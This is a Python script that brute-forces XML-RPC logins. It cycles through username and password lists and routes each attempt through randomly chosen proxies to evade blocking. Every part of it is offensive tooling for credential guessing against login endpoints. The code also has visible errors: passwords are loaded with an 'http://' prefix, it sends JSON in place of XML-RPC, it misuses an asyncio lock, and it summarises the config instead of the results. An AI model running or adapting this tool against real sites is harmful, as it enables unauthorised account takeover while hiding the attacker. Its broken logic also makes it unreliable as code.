import xmlrpc.client
import random
import logging
import time
import argparse
import json
import asyncio
from aiohttp_socks import ProxyConnector
from aiohttp import ClientSession
from tqdm import tqdm

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def setup_logging(log_level, log_file):
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        filename=log_file,
        filemode='a'
    )
    logging.getLogger().addHandler(logging.StreamHandler())

def load_config(file_path):
    try:
        with open(file_path, 'r') as f:
            config = json.load(f)
        logging.info(f'Loaded configuration from {file_path}.')
        return config
    except Exception as e:
        logging.error(f'Error loading configuration: {e}')
        return None

def load_file(file_path):
    try:
        with open(file_path, 'r', encoding='latin-1') as f:
            lines = [line.strip() for line in f if line.strip()]
            proxies = []
            for proxy in lines:
                if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                    proxy = f'http://{proxy}'
                proxies.append(proxy)
            return proxies
    except Exception as e:
        logging.error(f'Error loading file {file_path}: {e}')
        return []

async def attempt_login(session, url, username, password, proxy, delay):
    try:
        await asyncio.sleep(delay)

        connector = ProxyConnector.from_url(proxy)
        async with ClientSession(connector=connector) as session:
            payload = xmlrpc.client.ServerProxy(url)
            response = await session.post(url, json={'method': 'login', 'params': [username, password]})
            if response.status == 200:
                return f'{Colors.OKGREEN}Success: {username}:{password} through {proxy}{Colors.ENDC}'
            else:
                return None
    except Exception as e:
        logging.error(f'Error with {username}:{password} through {proxy} - {e}')
        return None

async def worker(session, usernames, passwords, proxies, url, results, lock, stop_on_success, delay):
    for username in usernames:
        for password in passwords:
            if not proxies:
                logging.error('No proxies available. Exiting.')
                return
            proxy = random.choice(proxies)
            result = await attempt_login(session, url, username, password, proxy, delay)
            if result:
                with lock:
                    results.append(result)
                    if stop_on_success:
                        return
            logging.info(f'Tried {username}:{password} through {proxy}.')

async def main_async(config):
    async with ClientSession() as session:
        lock = asyncio.Lock()
        results = []
        total_attempts = len(config['usernames']) * len(config['passwords'])
        with tqdm(total=total_attempts, desc="Brute-Force Progress", unit="attempt") as pbar:
            await asyncio.gather(
                worker(session, config['usernames'], config['passwords'], config['proxies'], config['url'], results, lock, config['stop_on_success'], config['delay'])
            )
            pbar.update(total_attempts)

def summarize_results(results):
    success_count = len([res for res in results if 'Success' in res])
    logging.info(f'Total attempts: {len(results)}')
    logging.info(f'Successful logins: {success_count}')

def main():
    parser = argparse.ArgumentParser(description='Brute-force XML-RPC login.')
    parser.add_argument('config', help='Path to the JSON configuration file.')
    args = parser.parse_args()

    config = load_config(args.config)
    if not config:
        return

    setup_logging(config.get('log_level', 'INFO'), config.get('log_file', 'brute_force.log'))
    
    config['proxies'] = load_file(config['proxy_file'])
    config['passwords'] = load_file(config['password_file'])

    username_mode = config.get('username_mode', 'constant')
    if username_mode == 'constant':
        config['usernames'] = [config.get('constant_username', 'admin')]
    else:
        config['usernames'] = load_file(config['username_file']) if config.get('username_file') else ['admin', 'user', 'test']

    asyncio.run(main_async(config))
    summarize_results(config)

if __name__ == '__main__':
    main()
